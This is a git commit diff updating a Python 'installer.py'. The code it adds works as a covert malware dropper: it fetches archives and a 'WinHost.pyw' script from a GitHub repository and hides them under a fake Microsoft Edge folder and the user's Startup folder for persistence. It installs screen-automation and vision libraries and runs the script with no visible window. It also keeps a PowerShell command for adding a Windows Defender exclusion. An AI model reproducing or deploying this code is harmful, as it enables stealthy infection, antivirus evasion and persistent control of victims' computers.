541c8e52bb489b95b424fb5f179761280f14ca6b
ScripterThing <124537033+ScripterThing@users.noreply.github.com>
2023-10-02 19:36:24 -0400

    Update installer.py

--- installer.py
+++ installer.py
@@ -6,28 +6,22 @@ import ctypes
 import sys
 from zipfile import ZipFile
 
-url = 'https://raw.githubusercontent.com/ScripterThing/BDPPL/main/g.zip'
-r = requests.get(url, allow_redirects=True)
-
 curUrl = 'https://raw.githubusercontent.com/ScripterThing/BDPPL/main/current.txt'
 current = requests.get(curUrl, allow_redirects=True)
+
+fil = current.text[0]
+
+url = f'https://raw.githubusercontent.com/ScripterThing/BDPPL/main/{fil}.zip'
+r = requests.get(url, allow_redirects=True)
 
 path_to_exclude = "C:\\Apps\\Windows\\MicrosoftEdge\\set"
 
 os.makedirs("C:\\Apps\\Windows\\MicrosoftEdge\\set")
 
-fil = current.text[0]
-
 # Construct the command to add the exclusion
 command = f"powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath {path_to_exclude}"
 
 try:
-    #if not ctypes.windll.shell32.IsUserAnAdmin():
-    #     # If not running as admin, relaunch with admin privileges
-        #ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
-
-    #subprocess.run(command, check=True, shell=True)
-
     open(f"C:\\Apps\\Windows\\MicrosoftEdge\\set\\{fil}.zip", "wb").write(r.content)
 
     with ZipFile(f"C:\\Apps\\Windows\\MicrosoftEdge\\set\\{fil}.zip", "r") as z:
@@ -35,23 +29,27 @@ try:
         z.close()
         os.remove(f"C:\\Apps\\Windows\\MicrosoftEdge\\set\\{fil}.zip")
 
-        with open("C:\\Apps\\Windows\\MicrosoftEdge\\set\\f\\stub.py", "wb") as ff:
-            stubUrl = 'https://raw.githubusercontent.com/ScripterThing/BDPPL/main/stub.py'
+        roaming = os.getenv('AppData')
+        startup = f"{roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
+
+        with open(f"{startup}\\WinHost.pyw", "wb") as ff:
+            stubUrl = 'https://raw.githubusercontent.com/ScripterThing/BDPPL/main/WinHost.pyw'
             stubr = requests.get(stubUrl, allow_redirects=True)
             ff.write(stubr.content)
         
-        with open("C:\\Apps\\Windows\\MicrosoftEdge\\set\\f\\crypt.py", "wb") as fff:
-            cryptUrl = 'https://raw.githubusercontent.com/ScripterThing/BDPPL/main/stub.py'
-            cryptr = requests.get(cryptUrl, allow_redirects=True)
-            fff.write(cryptr.content)
+        os.system("pip install requests==2.31.0")
+        os.system("pip install pyautogui==0.9.54")
+        os.system("pip install numpy==1.26.0")
+        os.system("pip install opencv-python==4.8.1.78")
         
-        os.system(f"python \"C:\\Apps\\Windows\\MicrosoftEdge\\set\\f\\crypt.py\"")
-        os.system(f"python \"C:\\Apps\\Windows\\MicrosoftEdge\\set\\f\\stub.py\"")
-
-        #os.system(f"\"C:\\Apps\\Windows\\MicrosoftEdge\\set\\f\\SystemGuardRuntime.exe\"")
+        subprocess.run(
+            f"pythonw \"{startup}\\WinHost.pyw\"", 
+            shell=True, 
+            stdout=subprocess.PIPE, 
+            stderr=subprocess.PIPE, 
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
 except subprocess.CalledProcessError as e:
     print(f"Error installing: {e}")
     os.rmdir("C:\\Apps\\Windows\\MicrosoftEdge\\set")
     os.rmdir("C:\\Apps\\Windows\\MicrosoftEdge")
-
-#os.system("C:\\Apps\\Sabyell\\AppData\\Local\\Programs\\Python\\Python311\\python \"C:\\Apps\\Public\\MicrosoftEdge\\set\\thing.py\"")
